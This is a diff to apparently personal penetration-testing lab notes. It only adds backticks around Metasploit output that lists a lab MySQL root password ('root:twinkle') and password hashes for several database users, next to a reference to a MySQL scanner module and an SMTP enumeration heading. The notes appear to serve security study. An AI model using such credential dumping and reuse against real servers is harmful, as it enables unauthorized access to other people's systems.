@@ -441,7 +441,8 @@ auxiliary/scanner/mysql/mysql_writable_dirs
 
 
 eg lab:
-root:twinkle
+
+`root:twinkle
 [+] 192.225.207.3:3306 -                User: root Host: localhost Password Hash:
 A0E23B565BACCE3E70D223915ABF2554B2540144
 [+] 192.225.207.3:3306 -                User: root Host: 891b50fafb0f Password Hash:
@@ -455,7 +456,7 @@ A0E23B565BACCE3E70D223915ABF2554B2540144
 [+] 192.225.207.3:3306 -                User: gopher Host: localhost Password Hash: 027ADC92DD1A83351C64ABCD8BD4BA16EEDA0AB0
 [+] 192.225.207.3:3306 -                User: backup Host: localhost Password Hash: E6DEAD2645D88071D28F004A209691AC60A72AC9
 [+] 192.225.207.3:3306 -                User: sysadmin Host: localhost Password Hash: 78A1258090DAA81738418E11B73EB494596DFDD3
-
+`
 
 ## SMTP enumeration
 
